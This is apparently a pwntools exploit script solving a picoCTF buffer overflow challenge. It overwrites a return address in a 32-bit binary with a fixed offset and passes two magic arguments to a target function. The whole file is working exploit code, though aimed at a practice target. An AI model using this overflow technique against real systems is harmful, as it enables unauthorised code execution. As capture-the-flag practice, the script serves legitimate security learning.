from pwn import * 

exe = ELF("./vuln")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 62270)

    return r

def main():
	r = conn()
	input()
	payload = b'A'*112 + p32(0x0804929a) + b'A'*4 + p32(0xcafef00d) + p32(0xf00df00d)
	r.sendlineafter(b'Please enter your string: \n', payload)
	pause()
	r.interactive()
if __name__ == "__main__":
	main()